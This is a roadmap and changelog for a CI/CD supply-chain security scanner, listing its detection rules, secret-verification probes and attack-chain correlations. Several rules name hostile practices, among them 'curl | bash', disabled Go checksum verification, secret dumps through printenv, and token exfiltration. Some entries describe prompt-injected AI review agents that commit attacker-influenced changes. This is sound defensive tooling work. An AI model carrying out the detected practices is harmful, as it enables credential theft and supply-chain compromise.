# Roadmap

What's planned, what's shipped, and what's deliberately out of scope.

## Shipped

### Unreleased (on ``dev``)

- **PyPI behavioral-trust signals (PYPI-019 / PYPI-020)** — The PyPI
  parallels of the NPM-015 / NPM-016 supply-chain-posture signals, both
  LOW and ``--resolve-remote``-gated. **PYPI-019** flags a direct
  dependency whose latest release ships no PEP 740 provenance
  attestation (reads the per-file ``provenance`` field from the PyPI
  JSON API; returns "unknown / skip" rather than flagging everything if
  the index doesn't expose the field). **PYPI-020** resolves a direct
  dependency's GitHub repo from ``info.project_urls`` and queries the
  OpenSSF Scorecard API, flagging upstreams scoring below 5/10 or
  failing the Dangerous-Workflow check (reuses the shared
  ``_primitives/scorecard`` client). Both reuse the per-package JSON
  document the cooldown / OSV passes already fetch, so provenance +
  repo-slug add no requests beyond the Scorecard lookup. The
  single-publisher analog (NPM-014) is deliberately not shipped: PyPI
  exposes no reliable maintainer-account-list API. New pypi
  registry-fetcher passes (``fetch_provenance`` / ``fetch_repo_slugs``)
  + a shared ``requirement_package_name`` extractor; wired across the
  standards data files mirroring NPM-015/016's coverage. pypi 17 -> 19.
- **CI Go-module-verification primitive (GHA-110 / GL-037 / CC-033)** —
  Builds the shared CI env-var primitive the roadmap reserved for the
  GOMOD-013/014 idea, rather than growing the gomod loader into a
  CI-config scanner. ``_primitives/go_insecure_env.py`` detects the Go
  toolchain settings that turn off module integrity verification
  (``GOFLAGS=-insecure``, ``GOSUMDB=off``, truthy ``GONOSUMCHECK``, any
  ``GOINSECURE``, a broad ``GOPRIVATE`` / ``GONOSUMDB`` glob) from both
  a declared env / variables map and an inline ``export`` in a ``run:``
  body; ``GOPROXY=off`` / ``direct`` and scoped ``GOPRIVATE`` are not
  flagged. Three HIGH consumer rules wire it into the platforms where
  Go CI actually runs: **GHA-110** (workflow / job / step ``env:`` +
  ``run:``), **GL-037** (global + job ``variables:`` + scripts),
  **CC-033** (job + run-step ``environment:`` + run commands). The
  env-var twin of GOMOD-001 (013's hard-disables + 014's
  over-broad-glob folded into one rule per provider). Bitbucket /
  Azure DevOps deferred (negligible Go CI, FP-risky env schemas; the
  primitive is shared, so adding them is small). Mapped across the
  standards data files (owasp / esf from declared tags, the rest from
  each standard's dependency-integrity control); GHA-110 also mapped in
  cis_github. github 100 -> 101, gitlab 38 -> 39, circleci 32 -> 33.
- **Weak-coverage deepening: deferred fourth-picks batch** — Five rules
  across four providers, the clean, net-new tail of the coverage-pass
  candidate list (the noisy / overlapping / parser-blocked picks were
  left deferred with rationale, see the Candidates section). **nuget:**
  NUGET-017 (HIGH, the public gallery active alongside a private feed
  and not disabled in ``<disabledPackageSources>``, the
  explicit-coexistence complement to NUGET-016's inheritance case; same
  ElementTree-reparse pattern). **cargo:** CARGO-014 (LOW, no committed
  cargo-deny / cargo-vet / cargo-audit gate config; the loader gained a
  small probe for ``deny.toml`` / ``supply-chain/config.toml`` /
  ``audit.toml`` walked up to the scan root). **pulumi:** PULUMI-014
  (MEDIUM, an ESC ``environment:`` import without a project / org
  qualifier, the StackReference-drift primitive applied to ESC).
  **argocd:** ARGOCD-016 (HIGH, Helm ``valueFiles`` fetched from a
  remote ``http(s)`` URL, an unpinned / unverified render input;
  scoped to the URL case to keep FP low) and ARGOCD-018 (MEDIUM,
  custom ``resource.customizations`` health / action Lua in
  ``argocd-cm``, code that runs in the application controller). All
  five wired across the standards data files (owasp / esf from each
  rule's declared tags, the rest cloned from the nearest sibling) and
  the provider / standards docs regenerated. nuget 18 -> 19, cargo
  13 -> 14, pulumi 13 -> 14, argocd 16 -> 18. The ``cis_github`` per-
  framework coverage floor drops 13 -> 12 (the expected denominator
  growth when non-GitHub rule packs land).
- **Weak-coverage deepening: cargo / helm batch** — Six rules closing
  the two packs that needed a loader extension, completing the
  first-batch sweep of every provider the coverage pass flagged.
  **cargo:** CARGO-011 (HIGH, ``build.rs`` runs network / process /
  ``include!`` idioms at compile time, the Rust analog of an npm
  install script), CARGO-012 (HIGH, ``.cargo/config.toml`` sets a
  ``[source.*] replace-with`` that reroutes the whole crate graph, or
  a linker / ``link-arg`` in ``rustflags``), CARGO-013 (MEDIUM, a
  ``Cargo.lock`` ``[[package]]`` resolved off crates.io via a ``git+``
  or alternate-registry source, the transitive substitution the
  manifest rules can't see). Loader now reads the sibling ``build.rs``,
  the nearest ``.cargo/config.toml`` (walked up to the scan root), and
  the ``Cargo.lock`` body. **helm:** HELM-015 (HIGH, an ``oci://``
  dependency bound only by a mutable tag, no Chart.lock digest and no
  digest reference, sharpening HELM-003 on the OCI axis), HELM-016
  (HIGH, a default secret / credential baked into ``values.yaml``,
  which the K8s render pass misses when consumed via ``| b64enc`` into
  a Secret), HELM-017 (HIGH, a ``{{ tpl .Values.x . }}`` that
  re-evaluates an operator-supplied value as a Go template, a chart
  SSTI sink). The helm ``Chart`` now carries the parsed
  ``values.yaml`` and ``templates/`` texts (dir + ``.tgz`` member).
  All six wired across the standards data files (owasp / esf from each
  rule's declared tags, the rest cloned from the nearest sibling) and
  the provider / standards docs regenerated. cargo 10 -> 13, helm
  14 -> 17. Catalog floor bumped 1090 -> 1110 across README / docs /
  action.yml / CONTRIBUTING / DOCKERHUB.
- **Weak-coverage deepening: gomod / rubygems / maven batch** — Nine
  rules continuing the weak-coverage provider deepening, the three
  packs the initiative flagged as needing no new base-loader reads.
  **gomod:** GOMOD-011 (MEDIUM, a ``tool`` directive promotes a module
  to a build-time executable that ``go generate`` / ``go tool`` runs,
  the module-graph analog of an npm install script) and GOMOD-012
  (HIGH, a ``require`` / ``replace`` coordinate whose host is a bare IP
  or carries an explicit ``:port``, a non-canonical fetch that bypasses
  TLS name binding + the canonical proxy). **rubygems:** GEM-011 (HIGH,
  a Bundler ``plugin`` directive runs its ``plugins.rb`` at
  ``bundle install`` time), GEM-012 (MEDIUM, a per-gem inline
  ``source:`` override splits one name off to a different registry,
  the per-gem face of GEM-007), GEM-013 (HIGH, a ``git:`` gem cloned
  over ``git://`` / ``http://`` with no server auth). **maven:**
  MVN-015 (HIGH, a command-running plugin, ``exec-maven-plugin`` /
  ``maven-antrun-plugin`` / ``gmavenplus-plugin`` /
  ``frontend-maven-plugin``, bound to the lifecycle via an
  ``<execution>``, build-time RCE that a version pin like MVN-012 does
  not stop), MVN-016 (HIGH, ``build.gradle`` re-enabling HTTP repos
  with ``allowInsecureProtocol = true``), MVN-017 (HIGH, a ``<server>``
  shipping a ``<privateKey>`` next to a plaintext ``<passphrase>``, the
  SSH / GPG sibling of MVN-010), MVN-018 (MEDIUM, a
  ``<distributionManagement>`` release repository that accepts mutable
  ``-SNAPSHOT`` artifacts). Loader adds: a ``tool``-directive parse
  (gomod) and a per-gem ``source:`` surface (rubygems); the maven rules
  reparse the POM / settings XML in-rule. All nine wired across the
  standards data files (owasp / esf from each rule's declared tags, the
  rest cloned from the nearest sibling) and the provider / standards
  docs regenerated. gomod 10 -> 12, rubygems 10 -> 13, maven 14 -> 18.
- **GHA-107 + GHA-108: runtime egress control (harden-runner)** — Two
  rules covering the StepSecurity ``harden-runner`` egress agent.
  GHA-107 (MEDIUM) fires when a ``step-security/harden-runner`` step
  runs with ``egress-policy: audit`` (also the default when the input
  is omitted), so outbound connections are logged but not blocked, the
  common half-adoption where a team gets visibility without prevention.
  GHA-108 (LOW, advisory) fires when a workflow mints an OIDC token
  (``id-token: write``) or gates a job on a deployment ``environment:``
  and no job uses an egress-control agent at all. The two are mutually
  exclusive: GHA-108 only fires when no harden-runner step exists. Both
  cite the tj-actions/changed-files compromise. This reverses the
  earlier "harden-runner is a runtime agent, deliberately out of scope"
  call (see the Self-hosted runner candidate). GHA 97 -> 99.
- **GHA-109: harden-runner is not the first step (LOW)** — Completes the
  harden-runner pack. Fires when a job uses
  ``step-security/harden-runner`` but a step (a checkout, a ``run:``, a
  setup action) runs before it, so that earlier step's outbound traffic
  is neither recorded nor filtered (harden-runner only covers what runs
  after it starts). Passes when it's the first step or the job doesn't
  use it. The common shape, a checkout placed first, is a small gap with
  a one-line fix, hence LOW. GHA 99 -> 100.
- **NPM-014: single-publisher supply-chain risk (LOW)** — Flags a
  direct dependency whose npm ``maintainers`` array has exactly one
  entry, a single point of compromise (the axios / chalk / lodash
  account-takeover class). Network-dependent: reuses the packument
  ``--resolve-remote`` already fetches for NPM-008 (cooldown), so it
  adds no requests. Scoped to direct dependencies; LOW severity so it
  stays below the default gate while still surfacing in a report. First
  of the three behavioral supply-chain signals (see Candidates).
  npm 13 -> 14.
- **NPM-015 + NPM-016: provenance gap + OpenSSF Scorecard (LOW)** — The
  other two behavioral supply-chain signals from the
  ``proof-of-commitment`` review, closing that candidate. NPM-015 flags
  a direct dependency whose latest version ships no build-provenance
  attestation (``dist.attestations``), so it can't be traced to its
  source commit and CI build, the SLSA / PEP 740 guarantee this project
  ships on its own wheel. NPM-016 resolves each direct dependency's
  GitHub repo from its packument and queries the OpenSSF Scorecard API
  (``api.securityscorecards.dev``), flagging upstreams that score below
  5/10 or fail the Dangerous-Workflow check (one extra API per linked
  repo). Both reuse the cached packument, are ``--resolve-remote``-gated,
  scoped to direct deps, and LOW severity. npm 14 -> 16.
- **AC-035: AI agent is both reviewer and committer (CRITICAL)** —
  New attack chain pairing GHA-103 (AI review bot on an untrusted
  trigger) with GHA-104 (direct push) or GHA-106 (write-scoped token)
  on one workflow. A prompt-injected agent reviews attacker input and
  commits its own change with no human in the loop. Closes the
  reviewer-and-committer gap in the AI-agent pack. Chain count
  48 -> 49.
- **AC-036: untrusted-code execution with no egress containment
  (HIGH)** — New attack chain pairing an execution leg (GHA-003 script
  injection, GHA-035 github-script injection, GHA-016 ``curl | bash``,
  or GHA-044 build-tool PPE) with an egress leg (GHA-107 harden-runner
  in audit mode, or GHA-108 no agent at all) on the same workflow.
  Attacker-influenced code runs while nothing blocks outbound traffic,
  so it can exfiltrate the OIDC token / GITHUB_TOKEN / secrets. Models
  missing egress control as a severity amplifier: GHA-107 / GHA-108
  alone are LOW advisories, but paired with a code-execution primitive
  they are the last-line gap harden-runner's block mode closes.
  Reachability promoted to HIGH confidence when the legs share a job;
  co-occurrence otherwise. Chain count 49 -> 50 (36 AC).
- **GHA-106: AI agent CLI runs with a write-scoped GITHUB_TOKEN
  (HIGH)** — Fires when an agentic CLI runs in a job whose
  ``GITHUB_TOKEN`` carries ``write-all`` / legacy ``write`` or
  ``contents`` / ``packages`` / ``actions`` / ``deployments: write``.
  A prompt-injected agent then acts with the token's full write scope.
  Upstream of GHA-104 (explicit push) and broader than GHA-061
  (App-token mint). MEDIUM confidence, mapped across all 12 applicable
  standards. GHA 96 -> 97.
- **GHA-105: self-hosted runner reachable from an untrusted PR
  trigger (HIGH)** — Fires when ``pull_request`` /
  ``pull_request_target`` can schedule a job on a self-hosted runner,
  so fork code runs on persistent org infrastructure. Complements
  GHA-012 (ephemeral) and GHA-036 (``runs-on`` interpolation). MEDIUM
  confidence, mapped across all 11 applicable standards. GHA 95 -> 96.
- **``--inline-explain`` across every reporter** — Lifted the
  exploit-example gate out of the terminal reporter into a shared
  ``inline_exploit()`` decision in ``checks/base.py``. SARIF (rule
  ``help``), JUnit (``<failure>`` body), markdown (collapsible
  Proof-of-exploit section), and Code Quality (issue ``description``)
  now honor ``--inline-explain``; JSON / HTML still carry the field
  unconditionally. Code Quality fingerprints are unchanged so dismissed
  MR threads don't churn.
- **Fixer discoverability (``--list-fixers``)** — New early-exit flag
  that lists every check ID with a registered autofixer
  (``ID  SEVERITY  TIER  TITLE``) and exits without scanning.
  ``--safety safe|unsafe|all`` filters by tier. Surfaces the full
  111-fixer set and which ``--fix`` mode runs each. Backed by a new
  ``iter_fixers()`` registry accessor and ``explain.render_fixers``;
  severity / title reuse the ``--explain`` index so a new fixer
  auto-lists. Documented under ``--man autofix``.

### v1.6.0 (2026-05-29)

- **Composer + RubyGems registry providers** — Two new
  dependency-supply-chain providers, both graduated to 10 rules in
  the same cycle they landed. ``--pipeline composer`` parses
  ``composer.json`` / ``composer.lock`` (COMPOSER-001..010);
  ``--pipeline rubygems`` parses ``Gemfile`` / ``Gemfile.lock``
  (GEM-001..010). Text-only static analysis, no runtime install.
  Plus NPM-013, NUGET-010, OCI-009 and the gomod / cargo / pulumi /
  nuget / maven / drone / argocd / helm / pypi rule-count deepenings
  that filled out the package-registry and GitOps packs. Provider
  count to 32.
- **Azure Cloud + GCP live cloud-posture providers (closes #163)** —
  Phase 1 seeded ``--pipeline azure-cloud`` and ``--pipeline gcp`` with
  15 rules each across identity, network, storage, compute, and logging.
  Phase 2 expanded both packs to 50 rules each, reaching parity with
  the AWS provider's coverage shape (71 rules). CIS Azure Foundations
  and CIS GCP Foundations standards mappings landed alongside.
  Provider rule counts: AZ 0 -> 50, GCP 0 -> 50.
- **Secret verifier expansion (phase 2)** — Twelve new live-verification
  probes for ``--verify-secrets``: DigitalOcean, Netlify, Terraform
  Cloud, Linear, Atlassian, Asana, New Relic, Telegram Bot, Replicate,
  Cohere, Mailchimp (datacenter-derived endpoint), Square. All probes
  are read-only, rate-limited, and identity-extracting where the API
  supports it. Verifier count 13 -> 25. 26 new tests.
- **Secrets-in-CI-logs detection (cross-provider)** — Four new rules
  detecting ``echo`` / ``printf`` / ``cat`` of secret-named variables,
  ``printenv`` / ``env`` environment dumps, and ``set -x`` shell trace
  with secret-bound variables in scope: GL-036 (GitLab CI), BB-032
  (Bitbucket Pipelines), ADO-031 (Azure DevOps), CC-032 (CircleCI).
  Shared detection logic in ``_primitives/log_leak.py``. Extends the
  existing GHA-033 pattern to every CI provider that supports inline
  scripts.
- **AI agent pipeline risk rules** — Two new rules expanding the
  GHA-058 agentic-CLI category. GHA-103 (CRITICAL) detects AI
  code-review bots (CodeRabbit, CodiumAI PR-Agent, Sourcery, Codeball,
  GitHub Copilot) running on ``pull_request_target`` or
  ``issue_comment`` triggers with write permissions and no
  ``environment:`` gate (the HackerBot-Claw vector). GHA-104 (HIGH)
  detects workflows where an agentic CLI generates code and pushes
  commits directly without routing through a PR review cycle. GHA rule
  count 93 -> 95.
- **Gitea / Forgejo Actions provider** — ``--pipeline gitea`` reuses
  the full GHA rule pack against ``.gitea/workflows/`` and
  ``.forgejo/workflows/`` YAML files. Auto-detected when either
  directory is present. GitHub-specific reputation rules pass silently
  when remote-resolve metadata is absent. Provider count 26 -> 27.
- **History dashboard enhancements (closes #160)** — The
  ``pipeline_check history`` dashboard gains per-rule burn-down
  sparklines, a resource-level heatmap of consistently failing file
  paths, and fleet directory integration so the history loader can
  read a fleet ``--output-dir`` directly with recursive
  ``**/findings.json`` discovery.
- **exploit_example backfill on all CRITICAL + HIGH rules** — Every
  CRITICAL rule (13) and every HIGH rule (36) now carries an
  ``exploit_example`` paired with the existing recommendation. Closes
  the "continuing posture: proof-of-exploit backfill" line item for
  the two top severities; MEDIUM / LOW remain opportunistic.
- **GitLab Code Quality output (``--output codequality``)** — Code
  Climate JSON shape that GitLab CI renders as inline MR annotations,
  the GitLab parallel of GitHub's SARIF code-scanning surface. One
  entry per ``(check_id, location)`` pair so aggregate findings produce
  one annotation per offending line. Stable SHA-1 fingerprint over
  ``(check_id, path, line, description)`` for cross-run dedupe. Zero
  new dependencies.
- **Inline explain mode (``--inline-explain``)** — Terminal flag that
  injects each failing finding's ``exploit_example`` under the
  Recommendation block in its panel, saving the
  ``pipeline_check --explain CHECK_ID`` round-trip during triage.
  Named with the ``inline-`` prefix to avoid colliding with the
  existing ``--explain CHECK_ID`` early-exit option.

### v1.5.0 (2026-05-27)

- **Build-time dependency SBOM generation** —
  ``--output cyclonedx`` emits a CycloneDX 1.6 JSON BOM of every
  build-time dependency the pipeline consumes. V1 ships extractors
  for GitHub Actions (action refs, reusable workflows, docker steps),
  Dockerfile (FROM base images), npm (package.json deps), and PyPI
  (requirements.txt entries). Each component carries a PURL
  identifier. ``BaseProvider.build_dependencies()`` is the extension
  point; providers not yet covered return an empty list. Deferred
  to v2: GitLab include refs, Helm chart deps, Maven, NuGet, OCI,
  SPDX output format. 49 tests.
- **OPA/Rego custom rule engine (closes #176)** —
  ``--rego-rules ./policies/`` discovers ``.rego`` files, extracts
  metadata via ``opa inspect --annotations``, evaluates policies via
  ``opa eval``, and funnels results through the existing
  Finding/scoring/gating/SARIF pipeline. Each ``.rego`` file declares
  rule ID, severity, and provider via OPA's ``# METADATA`` annotation
  block. Rego rules can target all 24 providers (the YAML DSL is
  limited to 7). The ``opa`` binary is a soft dependency (shell-out,
  documented install, clean error when missing). Config-file support
  via ``rego_rules:`` in ``.pipeline-check.yml`` / ``pyproject.toml``.
  ``findings_so_far`` input deferred to v2. 22 tests. See
  ``docs/writing_a_rego_rule.md``.
- **GitLab remote ``include:`` resolver (closes #164)** —
  Cross-document taint resolution for GitLab CI. When
  ``--resolve-remote`` is on, the provider fetches
  ``include: { project/remote/template/component }`` directives via
  the GitLab API and merges them into the pipeline document before
  rules run. TAINT-004 (dotenv artifact flow) and TAINT-008
  (extends-chain inheritance) now see jobs and templates from remote
  includes. Four include types: ``project:`` (file API with
  ``PRIVATE-TOKEN``), ``remote:`` (HTTPS-only direct fetch),
  ``template:`` (templates API), ``component:`` (URI-parsed to project
  file fetch). Recursive resolution with depth limit and cycle
  detection. Disk cache at
  ``~/.cache/pipeline-check/gitlab-resolver/``. New CLI options:
  ``--gitlab-token``, ``--gitlab-url``. Closes the last known gap in
  the TAINT engine's coverage.
- **Supply-chain posture rule pack** — Six rules
  informed by ``6mile/gimmepatz``, ``6mile/tvpo``,
  ``SecureStackCo/visualizing-software-supply-chain``, and the
  OSC&R technique catalog.  GHA-097 (recursive PR auto-merge loop,
  OSC&R PER-1), GHA-098 (deploy without security scan gate,
  OSC&R DE-4), GHA-099 (deploy env plaintext secret, OSC&R CA-6),
  SCM-048 (org codespace secrets scoped to all repos, new
  ``/orgs/{owner}/codespaces/secrets`` API fetch), SCM-049 (classic
  PAT detection via token-prefix inspection), NPM-012 (legacy
  publish token lacking ``npm_`` granular-token restrictions).
  All six mapped to OWASP, OSC&R, and all 16 standards.  Rule
  counts: GHA 87 -> 90, SCM 47 -> 49, npm 11 -> 12.
- **OSC&R standard mapping** — 16th standards mapping.
  OSC&R (Open Software Supply Chain Attack Reference,
  ``pbom-dev/OSCAR``) is a MITRE ATT&CK-style matrix for software
  supply chain attacks: 12 tactics, 86 techniques.  610 checks
  mapped to 61 of 86 techniques; 25 attacker-side techniques
  (reconnaissance, resource development, runtime exploitation) left
  unmapped with documented gaps.  Control IDs use a
  ``<tactic-abbreviation>-<sequence>`` scheme minted by this project
  (not upstream).  ``--standard oscr`` inherits from existing
  standards plumbing.  Generated docs page at
  ``docs/standards/oscr.md``.  Standards count 15 -> 16.
  Informed by ReversingLabs OSC&R glossary.
- **Live secret verification (closes #175)** —
  ``--resolve-remote --verify-secrets`` probes every credential-shaped
  finding against its issuing API. Three buckets: VERIFIED (active
  token, promotes to CRITICAL with the resolved identity attached),
  UNVERIFIED (revoked or rotated, demotes to LOW), UNKNOWN (no
  verifier or probe inconclusive, severity unchanged). Initial
  verifier pack: GitHub PAT, GitLab PAT, NPM token, Slack token,
  Anthropic, OpenAI, Hugging Face, Stripe, and SendGrid API keys.
  ``--verify-secrets-show-identity`` opts into full identity strings
  in output. Raw secret values are never persisted; cache keys are
  SHA-256 digests. Stderr nudge printed when secrets found without
  verification enabled. Inspired by trufflehog ``--only-verified``.
  Verifier modules under ``_primitives/secret_verifiers/``, one per
  issuing service.
- **Secret verifier expansion phase 1** —
  Four new live-verification probes: Docker Hub PAT
  (``/v2/user`` bearer probe, identity extraction), PyPI upload
  token (405-based auth confirmation against ``upload.pypi.org``),
  Google Cloud API key (Generative Language API endpoint probe
  with ``INVALID_ARGUMENT`` / ``API_KEY_INVALID`` classification),
  JWT (issuer-based routing with Auth0 / Okta / Azure AD / Google
  userinfo probes; GitHub OIDC tokens recognized with
  ``sub``-extracted identity but not probed since they are
  short-lived). Verifier count 9 -> 13. 18 new tests.
- **Org-wide fleet scanning phase 2 (closes #161)** —
  ``--from-org ORG`` enumerates repos from the SCM API (GitHub, GitLab,
  Bitbucket backends with pagination, archived repos excluded).
  ``--include`` / ``--exclude`` glob filters on repo name.
  ``--jobs N`` for parallel clones and scans (auto-detected worker
  count by default). ``--scan-flags`` forward arbitrary flags to each
  per-repo subprocess via ``shlex.split``. Multi-platform YAML
  coordinates (``gitlab:group/sub/project``,
  ``bitbucket:workspace/slug``). Cross-repo CXPC chain evaluation runs
  automatically after all per-repo scans complete. Still deferred:
  ``--baseline-dir`` regression diffing, per-repo SARIF output,
  per-repo ``threats.md``.
- **Cross-repo XPC chains (closes #173)** — Four
  ``CXPC-NNN`` chains that fire only during fleet scans, composing
  findings across repo boundaries. CXPC-001: npm publish-side cooldown
  (NPM-008) + floating consumer in a partner repo (NPM-001/NPM-002),
  HIGH, T1195.002 / T1078.004. CXPC-002: Argo CD wildcard
  ``sourceRepos`` (ARGOCD-001) + weakened CI gate in a partner repo
  (GHA-002/TAINT-001/TAINT-002), CRITICAL, T1195.002 / T1199 /
  T1078.004. CXPC-003: unscoped App-token mint (GHA-061) + credential
  exposure in a partner repo (GHA-005/GHA-008), HIGH, T1078.004 /
  T1098.001. CXPC-004: tainted reusable-workflow producer
  (TAINT-001/002/003) + any GHA consumer finding in a partner repo,
  HIGH, T1195.002 / T1199. All four use v1 co-occurrence reachability
  at MEDIUM confidence. Chain engine gained
  ``evaluate_cross_repo(findings_by_repo)``. Chain count 41 -> 45.
- **cicd-goat 38-scenario coverage push** —
  Three new rules, one widening, three attack chains close every
  pipeline-check-side gap in the expanded 38-scenario corpus.
  GHA-100 (``cosign verify`` without ``--certificate-identity`` +
  ``--certificate-oidc-issuer``, scenario 35, solo catch across all
  scanners). TAINT-009 (environment-protected secret flows to
  unprotected consumer job via ``needs.<job>.outputs``, scenario 36,
  solo catch). GHA-102 (``actions/checkout`` with
  ``submodules: recursive`` on a PR trigger, scenario 38, solo catch).
  GHA-063 widened to promote severity to CRITICAL when the bot-actor
  gate combines with ``gh pr merge --auto`` or the
  ``hmarr/auto-approve-action`` family (Synacktiv confused-deputy
  primitive). AC-032 (cosign-unbound artifact to deploy,
  GHA-100 + GHA-098), AC-033 (environment-secret laundering,
  TAINT-009 + GHA-098), AC-034 (submodule-poisoned PR to credential
  exfiltration, GHA-102 + GHA-037/GHA-004). GHA rule count
  90 -> 93; chain count 45 -> 48. 40 tests. Remaining gap:
  scenarios 20, 29, 34 need cicd-goat comparison-config fixes
  (upstream PRs filed); scenario 37 is blocked by cicd-goat's
  ``if: false`` safety model (filed upstream).

### v1.4.0 (2026-05-22)

- **NuGet provider** — Fifth dependency-supply-chain
  provider. Parses ``*.csproj``, ``Directory.Packages.props``,
  ``packages.config``, ``NuGet.config``, ``packages.lock.json``.
  Nine rules (NUGET-001..009). Provider count 23 -> 24. 22 tests.
- **Live OSV advisory lookup** — Shared
  ``_primitives/osv_fetcher.py`` queries the OSV batch API. Four
  new rules: NPM-010, PYPI-009, MVN-009, NUGET-009.
- **Zizmor parity sweep (GHA-063 .. GHA-096)** —
  Full gap analysis against ``zizmorcore/zizmor`` v1.25.2. Every
  genuine gap landed: GHA-063 bot-conditions, GHA-064 unsound-
  contains, GHA-065 zero-width/bidi unicode, GHA-066 upload-artifact
  wildcard, GHA-067 cache-sensitive-files, GHA-068 deprecated-runner,
  GHA-069 orphan id-token:write, GHA-070 ssh-keyscan TOFU, GHA-071
  powershell-on-Linux, GHA-072 overprovisioned-secrets, GHA-073
  unused workflow_call.secrets, GHA-088 typosquat-uses, GHA-089
  archived-uses, GHA-090 impostor-commit, GHA-091 takeover-eligible
  org, GHA-092 TOCTOU PR head SHA, GHA-093 Living-off-the-Pipeline,
  GHA-094 branch-tip ref, GHA-095 ref-version-mismatch, GHA-096
  known-vulnerable action via GHSA. Plus widenings: GHA-004 top-level
  write-scope aggregation, GHA-053 PR label/milestone predicates,
  GHA-058 agentic AI tool after PR checkout, GHA-003 services
  sinks, GHA-050 attestation-disabled. ``--only-known-attacked``
  filter also landed.
- **cicd-goat 29/29 scenario coverage (v1.3.0 .. v1.4.0)** —
  Every scenario in the ``greylag-ci/cicd-goat`` 29-scenario matrix
  has at least one mapped rule. Final gaps closed with GHA-086
  (wildcard branch trigger + environment), GHA-087 (secret-derivation
  echo), local composite-action scanning, and multi-provider
  invocations.
- **Inline source-line ignore comments** — Three
  directive variants: ``ignore[ID]``, ``ignore-next-line[ID]``,
  ``ignore-file[ID]``. Both ``#`` and ``//`` comment prefixes.
  Disabled via ``--no-inline-ignore``. 23 tests.
- **Autofix safety tiers** — ``--fix`` runs safe fixers
  only; ``--fix=unsafe`` runs both. 109 safe, 2 unsafe. Missing
  labels default to unsafe.
- **Direct-HCL Terraform parsing** — ``--tf-source``
  parses ``*.tf`` files directly via ``python-hcl2``. All 58 TF-NNN
  rules run unchanged. Variable/local substitution is best-effort.
  Closes the ``terragoat`` skip in ``bench/goats/``. 23 tests.
- **Gradle multi-project ``rootProject.ext.X`` resolution** —
  Closes the last remaining gap in the dependency-supply-chain
  provider follow-ups. The maven provider's Gradle path now walks
  upward from each ``build.gradle`` looking for ``settings.gradle``
  to identify the multi-project root, reads the root's
  ``build.gradle*`` for ``ext { X = ... }`` / ``ext.X = ...`` /
  ``def X`` / ``val X`` declarations, and exposes each value under
  both ``rootProject.ext.X`` and ``rootProject.X`` keys. Five new
  tests cover the Groovy and Kotlin DSLs.
- **AC-031 attack chain: Argo CD PR generator x wildcard sourceRepos**
  — Second Argo CD chain. CRITICAL severity. Pairs ARGOCD-006
  (ApplicationSet PR/SCM generator without a project allowlist) with
  ARGOCD-001 (AppProject ``sourceRepos: ['*']``). Chain count
  40 -> 41.
- **AC-030 attack chain: Argo CD anonymous access x wildcard RBAC** —
  First attack-chain pairing the Argo CD provider's rules. CRITICAL
  severity. Fires when ARGOCD-009 (anonymous access) and ARGOCD-004
  (wildcard authority grant) both fail against the same instance.
  Chain count 39 -> 40.
- **XPC-010 attack chain: npm cooldown x Dockerfile lifecycle** —
  Cross-provider chain pairing NPM-008 (cooldown window) and
  DF-024 (Dockerfile install runs lifecycle scripts). Severity HIGH.
  Chain count 38 -> 39.
- **Dependency-supply-chain provider follow-ups (v1.0.5 .. v1.4.0)** —
  Lockfile + manifest-format coverage, cooldown trilogy (NPM-008 /
  PYPI-008 / MVN-008), NPM-009 new-transitive-dep diff gate, CI
  hash-verification gates, Gradle property + version-catalog
  resolution, ``rootProject.ext.X`` cross-project indirection,
  XPC-010 cooldown + lifecycle chain. All gaps closed.

### v1.3.0 (2026-05-21)

- **Argo CD provider** — New CD-side provider, kept
  disjoint from the existing ``argo`` (Argo Workflows) pack.
  ``--pipeline argocd`` parses ``Application`` / ``ApplicationSet`` /
  ``AppProject`` CRDs plus the ``argocd-cm`` / ``argocd-rbac-cm``
  ConfigMaps. Nine rules (ARGOCD-001..009). Provider count
  22 -> 23. 22 tests.
- **GitHub Actions cicd-goat coverage push** —
  Two new rules and one widened taint hop, plus five existing-rule
  widenings, close eleven ``greylag-ci/cicd-goat`` scenarios in one
  cycle. GHA-062, GHA-061, GHA-008 keyed-hex shape, TAINT-002
  widened for matrix-axis expansion. Also: GHA-016, GHA-019, GHA-033,
  GHA-049, GHA-057 widenings.
- **Auto-publish GitHub Release on tag push** —
  ``release.yml`` gained a ``publish-github-release`` job that
  extracts the matching ``## [X.Y.Z]`` section from ``CHANGELOG.md``
  and runs ``gh release create``. Closes the Marketplace-tile gap
  that stranded the tile on v1.0.5 for two cycles.
- **Org-wide fleet scanning phase 1 (closes #161)** —
  ``pipeline_check fleet --repos repos.yml`` reads a YAML list of
  ``owner/repo`` coordinates, shallow-clones each, runs per-repo
  scans, and writes ``fleet.json`` aggregate + ``fleet.md`` digest.

### v1.0.x – v1.2.0

- v1.0.x — first production-stable release. Carries every v0.4 / v0.5
  / v0.6 item (STRIDE threat model, MCP server, SCM provider,
  composite-action resolution, action-reputation pack, multi-scanner
  SARIF ingest, taint engine spanning 8 rules across 5 providers,
  multi-provider scan mode, attestation content checks, GHA-04x PPE
  rules, extended obfuscated-exec catalog), plus the API-stability
  commitment on ``pipeline_check.__all__``. Mid-cycle: five-rule
  worm-mitigation pack (DF-024, DF-025, GHA-048, GHA-049, GHA-050).
- **npm + pypi dependency-supply-chain providers (v1.0.5)** —
  ``--pipeline npm`` and ``--pipeline pypi``. Fourteen rules total
  (NPM-001..007 + NPM-011, PYPI-001..006).
- **Maven dependency-supply-chain provider (v1.0.5)** —
  ``--pipeline maven``. Seven rules (MVN-001..007). Provider count
  to 22.
- **SCM GitLab + Bitbucket platform parity (v1.0.1)** —
  ``--scm-platform gitlab`` and ``--scm-platform bitbucket`` with a
  7-rule universal subset.
- **Container image distribution (v1.0.1)** —
  ``ghcr.io/dmartinochoa/pipeline-check`` and Docker Hub, multi-arch,
  with Docker Scout gating and SLSA provenance + SBOM attestations.
- **SLSA Build L3 provenance on the wheel (v1.0.4)** — Every
  tagged release runs ``slsa-framework/slsa-github-generator`` with
  Sigstore signing. PyPI trusted publishing with PEP 740 attestations.
- **LSP server (v1.1.0)** — ``pipeline_check/lsp/`` is a
  ``pygls`` 2.x server behind the ``pipeline-check[lsp]`` extra.
  Editor diagnostics match ``pipeline_check --output json``.
- **Real-world GOAT corpus benchmark (v1.1.0)** —
  `bench/goats/` ships pinned-clone benchmarks: ``cicd-goat`` (9/9),
  ``cfngoat`` (6/6), ``kubernetes-goat`` (27/27), ``terragoat``
  (pending curation). 42 check IDs locked. CI workflow runs nightly
  + on PRs. See ``docs/goat_bench.md``.

### Pre-1.0

- v0.4.x / v0.5.x / v0.6.x — pre-1.0 milestone work folded into
  v1.0.x. See `CHANGELOG.md` for the per-version trail.
